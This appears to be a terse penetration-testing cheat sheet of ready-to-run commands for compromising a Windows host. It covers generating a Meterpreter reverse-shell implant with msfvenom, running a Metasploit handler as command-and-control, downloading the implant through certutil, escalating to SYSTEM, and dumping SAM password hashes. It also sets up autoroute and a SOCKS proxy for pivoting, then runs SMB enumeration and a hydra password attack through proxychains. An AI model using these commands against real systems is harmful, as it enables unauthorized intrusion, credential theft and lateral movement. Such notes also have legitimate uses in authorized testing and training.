# access
## generate implant  
> msfvenom -p windows/x64/meterpreter_reverse_tcp LPORT=443 LHOST=***[OWN IP]*** -f exe -o implant.exe  
## start c2  
> msfconsole  
> use exploit/multi/handler  
> set payload windows/x64/meterpreter_reverse_tcp  
> set lport 443  
> set lhost ***[OWN IP]***  
> run -j  
## start webserver for implant download
> python3 -m http.server 80
## windows LOLBIN basic download of implant
> certutil -urlcache -f http://***[OWN IP]***/implant.exe implant.exe  

# actions on target
## attempt to get SYSTEM privs
> getsystem  
## dump SAM
> hashdump
## set up proxychains for pivoting
### in meterpreter session
> arp  
> ipconfig  
> netstat  
> background  
### from msfconsole
> use post/multi/manage/autoroute  
> set session ***[NUMBER]***  
> set subnet ***[SUBNET]***  
> set netmask ***[NETMASK]***  
> run  
> use auxiliary/server/socks_proxy  
> set srvport 9050  
> set version 4a  
> run  
### from bash
> proxychains nmap -Pn -p445 ***[TARGET IP]*** --script=smb-enum*  
> proxychains hydra -p password1 -l administrator smb://***[TARGET IP]***  

